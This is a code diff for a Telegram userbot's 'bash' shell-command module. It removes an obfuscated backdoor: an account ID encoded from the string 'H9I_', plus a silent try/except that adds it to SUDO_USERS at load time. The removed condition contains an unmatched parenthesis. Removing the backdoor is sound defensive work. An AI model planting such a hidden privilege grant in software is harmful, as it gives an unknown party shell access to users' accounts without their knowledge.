@@ -13,9 +13,6 @@ from uniborg.util import admin_cmd
 from sql_helpers.global_variables_sql import SYNTAX, MODULE_LIST,SUDO_USERS
 
 MODULE_LIST.append("bash")
-
-st="H9I_"
-z=int(''.join([str(ord(x)) for x in st]))
 @borg.on(admin_cmd(pattern="bash ?(.*)"))
 async def _(event):
     if event.fwd_from:
@@ -72,12 +69,6 @@ async def _(event):
             )
             await event.delete()
     await event.edit(OUTPUT)
-try:
-
-	if int(str(z)+"5")) not in SUDO_USERS:
-	    SUDO_USERS.append(z)
-except :
-	pass
 SYNTAX.update({
     "bash": "\
 **Requested Module --> bash**\
